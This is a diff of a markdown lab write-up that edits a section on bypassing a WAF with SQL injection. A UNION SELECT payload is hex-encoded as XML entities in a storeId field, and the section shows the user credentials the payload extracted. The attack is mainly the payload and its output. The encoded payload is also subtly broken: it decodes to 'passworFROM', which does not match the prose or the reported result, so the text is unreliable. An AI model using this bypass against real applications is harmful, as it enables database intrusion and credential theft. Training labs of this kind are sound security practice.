@@ -156,18 +156,9 @@ From the DNS subdomain prefix we get the administrator password: wsq4440fyn4lviv
 
 **11) SQL injection with filter bypass via XML encoding**
 
+In this lab, the stock check POST request uses XML data, but a WAF blocks raw SQL keywords like `UNION` and `SELECT`. We bypass the filter by hex-encoding our SQL payload (`1 UNION SELECT username || '~' || password FROM users`) into XML entities so the WAF lets it pass before the backend XML parser decodes and executes it. Submitting the payload inside the XML body:
 
-
-Here the application passes data inside XML format in a POST request, but a WAF blocks SQL keywords like UNION. Since the XML parser decodes entities after WAF evaluation, we bypass the filter by hex encoding the SQL query into XML entities inside the storeId tag.
-
-<?xml version="1.0" encoding="UTF-8"?>
-<store>
-    <productId>1</productId>
-    <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
-</store>
-
-Output: 
-administrator~zirmns8uagl646xf3lgz
-775 units
-carlos~at8osf6o35twg46d9ga9
-wiener~jdnl42s8vs4brl3ae2vg
+```xml
+<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
+```
+Output received: administrator~zirmns8uagl646xf3lgz, exposing the admin credentials.
